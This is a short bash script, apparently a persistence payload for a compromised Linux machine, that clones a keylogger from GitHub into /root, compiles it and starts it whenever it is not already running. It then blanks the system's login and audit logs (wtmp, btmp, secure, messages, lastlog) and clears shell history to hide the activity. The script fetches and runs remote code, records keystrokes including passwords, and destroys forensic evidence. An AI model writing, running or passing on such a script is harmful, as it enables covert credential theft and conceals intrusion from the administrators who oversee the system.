#!/bin/bash
#version 0.0.3

if [ -d "/root/Files" ]
	then
    		:
	else
		cd /root/
		git clone https://github.com/gsingh93/simple-key-logger.git
		mv /root/simple-key-logger/ /root/Files/
		cd /root/Files/
		make
fi

result=`ps aux | grep -i "skeylogger" | grep -v "grep" | wc -l`
if [ $result -ge 1 ]
   then
        :
   else
	cd /root/Files/
	./skeylogger
fi

echo >/var/log/wtmp
echo >/var/log/btmp
echo >/var/log/secure
echo >/var/log/messages
echo >/var/log/lastlog
history -c && history -w 
